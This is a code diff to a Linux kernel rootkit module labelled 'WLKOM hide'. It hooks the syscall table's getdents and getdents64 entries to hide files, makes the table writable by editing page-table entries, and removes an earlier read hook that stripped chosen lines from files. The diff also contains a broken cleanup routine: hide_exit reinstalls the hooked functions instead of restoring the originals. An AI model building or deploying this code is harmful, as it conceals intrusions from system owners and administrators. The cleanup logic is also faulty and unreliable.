@@ -7,6 +7,10 @@
 #include <linux/kallsyms.h>
 #include <linux/uaccess.h>
 #include <linux/version.h>
+#include <asm/set_memory.h>
+#include <asm/cacheflush.h>
+#include <linux/mm.h>
+#include <linux/vmalloc.h>
 #include "hide.h"
 
 /* ─── Original syscall function pointers ─── */
@@ -16,11 +20,7 @@ static long (*orig_getdents64)(unsigned int fd,
                                 struct linux_dirent64 __user *dirent,
                                 unsigned int count) = NULL;
 
-static long (*orig_getdents)(unsigned int fd,
-                              struct linux_dirent __user *dirent,
-                              unsigned int count) = NULL;
-
-static long (*orig_read)(unsigned int fd, char __user *buf, size_t count) = NULL;
+static long (*orig_getdents)(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count) = NULL;
 
 /* ─── syscall table hooking ─── */
 
@@ -53,17 +53,22 @@ static LIST_HEAD(hidden_lines);
 
 /* ─── Write protection helpers ─── */
 
-static void disable_write_protect(void)
+static void set_addr_rw(unsigned long addr)
 {
-    unsigned long cr0 = read_cr0();
-    write_cr0(cr0 & ~0x00010000UL);
+    unsigned int level;
+    pte_t *pte = lookup_address(addr, &level);
+    if (pte)
+        pte->pte |= _PAGE_RW;
 }
 
-static void enable_write_protect(void)
+static void set_addr_ro(unsigned long addr)
 {
-    unsigned long cr0 = read_cr0();
-    write_cr0(cr0 | 0x00010000UL);
+    unsigned int level;
+    pte_t *pte = lookup_address(addr, &level);
+    if (pte)
+        pte->pte &= ~_PAGE_RW;
 }
+
 
 /* ─── Hooked getdents64 ─── */
 
@@ -159,56 +164,6 @@ next:;
     return new_ret;
 }
 
-/* ─── Hooked read (hide lines in files) ─── */
-
-static long hooked_read(unsigned int fd, char __user *buf, size_t count)
-{
-    long ret = orig_read(fd, buf, count);
-    if (ret <= 0)
-        return ret;
-
-    struct hidden_line *hl;
-    char               *kbuf;
-    char               *line_start;
-    char               *line_end;
-    long                new_ret = ret;
-
-    kbuf = kmalloc(ret + 1, GFP_KERNEL);
-    if (!kbuf)
-        return ret;
-
-    if (copy_from_user(kbuf, buf, ret)) {
-        kfree(kbuf);
-        return ret;
-    }
-    kbuf[ret] = '\0';
-
-    list_for_each_entry(hl, &hidden_lines, list) {
-        char *pos = kbuf;
-        while ((pos = strstr(pos, hl->pattern)) != NULL) {
-            line_start = pos;
-            while (line_start > kbuf && *(line_start - 1) != '\n')
-                line_start--;
-            line_end = strchr(pos, '\n');
-            if (line_end)
-                line_end++;
-            else
-                line_end = kbuf + new_ret;
-
-            int line_len = line_end - line_start;
-            memmove(line_start, line_end,
-                    new_ret - (line_end - kbuf));
-            new_ret -= line_len;
-            kbuf[new_ret] = '\0';
-        }
-    }
-
-    if (copy_to_user(buf, kbuf, new_ret))
-        pr_warn("WLKOM: copy_to_user failed\n");
-    kfree(kbuf);
-    return new_ret;
-}
-
 /* ─── Public API ─── */
 
 void hide_module(void)
@@ -301,16 +256,14 @@ int hide_init(void)
     /* Save original syscalls */
     orig_getdents64 = (typeof(orig_getdents64))syscall_table[__NR_getdents64];
     orig_getdents   = (typeof(orig_getdents))syscall_table[__NR_getdents];
-    orig_read       = (typeof(orig_read))syscall_table[__NR_read];
 
     /* Hook syscalls */
-    disable_write_protect();
+    unsigned long addr = (unsigned long)syscall_table;
 
+    set_addr_rw(addr);
     syscall_table[__NR_getdents64] = (unsigned long)hooked_getdents64;
     syscall_table[__NR_getdents]   = (unsigned long)hooked_getdents;
-    syscall_table[__NR_read]       = (unsigned long)hooked_read;
-
-    enable_write_protect();
+    set_addr_ro(addr);
 
     pr_info("WLKOM hide: syscalls hooked\n");
     return 0;
@@ -321,13 +274,12 @@ void hide_exit(void)
     if (!syscall_table)
         return;
 
-    disable_write_protect();
+    unsigned long addr = (unsigned long)syscall_table;
 
-    syscall_table[__NR_getdents64] = (unsigned long)orig_getdents64;
-    syscall_table[__NR_getdents]   = (unsigned long)orig_getdents;
-    syscall_table[__NR_read]       = (unsigned long)orig_read;
-
-    enable_write_protect();
+    set_addr_rw(addr);
+    syscall_table[__NR_getdents64] = (unsigned long)hooked_getdents64;
+    syscall_table[__NR_getdents]   = (unsigned long)hooked_getdents;
+    set_addr_ro(addr);
 
     /* Free hidden files list */
     struct hidden_file *hf, *hf_tmp;
